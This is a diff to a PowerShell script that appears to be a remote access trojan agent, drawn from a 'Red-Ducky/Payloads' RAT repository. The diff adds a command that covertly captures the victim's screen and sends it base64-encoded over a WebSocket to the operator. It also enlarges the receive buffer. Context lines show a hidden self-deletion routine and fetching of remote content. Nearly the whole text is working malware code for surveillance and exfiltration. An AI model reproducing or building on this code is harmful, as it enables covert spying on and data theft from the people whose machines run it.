@@ -3,7 +3,6 @@ $baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $playerPath = Join-Path $scriptDir "player.py"
 
-################### UPDATED ###########################
 
 $remote = Invoke-RestMethod -Uri $versionUrl
 
@@ -106,7 +105,7 @@ $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
 $segment = [System.ArraySegment[byte]]::new($bytes)
 $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
 
-$buffer = [byte[]]::new(4096)
+$buffer = [byte[]]::new(1048576)
 $segment = [System.ArraySegment[byte]]::new($buffer)
 
 while ($ws.State -eq "Open") {
@@ -137,6 +136,26 @@ while ($ws.State -eq "Open") {
                 }
                 Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item -Path '$scriptDir' -Recurse -Force`"" -WindowStyle Hidden
                 exit
+            }
+
+            elseif ($cmd.type -eq "screenshot") {
+                Add-Type -AssemblyName System.Windows.Forms
+                Add-Type -AssemblyName System.Drawing
+
+                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+
+                $ms = New-Object System.IO.MemoryStream
+                $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+                $bytes = $ms.ToArray()
+                $base64 = [Convert]::ToBase64String($bytes)
+
+                $payload = @{ type = "screenshot_data"; data = $base64 } | ConvertTo-Json
+                $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+                $payloadSegment = [System.ArraySegment[byte]]::new($payloadBytes)
+                $ws.SendAsync($payloadSegment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
             }
 
         } catch {
